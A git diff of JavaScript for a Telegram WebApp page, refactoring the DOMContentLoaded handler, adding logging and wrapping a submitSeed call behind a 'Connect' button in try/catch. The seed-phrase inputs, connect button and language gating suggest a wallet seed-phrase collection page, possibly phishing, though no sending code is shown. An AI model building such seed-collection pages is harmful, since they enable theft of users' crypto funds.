@@ -24,38 +24,31 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
 }
 
 // ✅ DOM
-window.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", () => {
     console.log("📦 DOMContentLoaded подія спрацювала");
 
-    feather.replace();
-
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-
-        if (!window.Telegram || !Telegram.WebApp) {
-            console.warn("❌ Telegram WebApp не ініціалізовано!");
-        } else {
-            console.log("✅ Telegram WebApp працює");
-        }
+    // Перевірка Telegram WebApp
+    if (!window.Telegram || !Telegram.WebApp) {
+        console.warn("❌ Telegram WebApp не ініціалізовано!");
     } else {
-        console.warn("❌ Telegram.WebApp обʼєкт не визначено (не в Telegram?)");
+        console.log("✅ Telegram WebApp працює");
     }
 
-    if (document.getElementById("seedContainer")) {
-        renderSeedInputs();
-        setupSelect();
-    } else if (window.location.href.includes("profile.html")) {
-        showProfileData();
-    }
-
+    // Знаходимо кнопку
     const btn = document.getElementById("submitBtn");
     console.log("🔍 Кнопка #submitBtn:", btn);
+
     if (btn) {
         btn.addEventListener("click", () => {
             console.log("🔘 Кнопка 'Подключить' нажата");
-            submitSeed();
+            try {
+                submitSeed();  // ← виклик твоєї функції
+            } catch (e) {
+                console.error("❌ Помилка у submitSeed:", e);
+            }
         });
+    } else {
+        console.warn("🚫 Кнопка #submitBtn не знайдена у DOM");
     }
 });
 
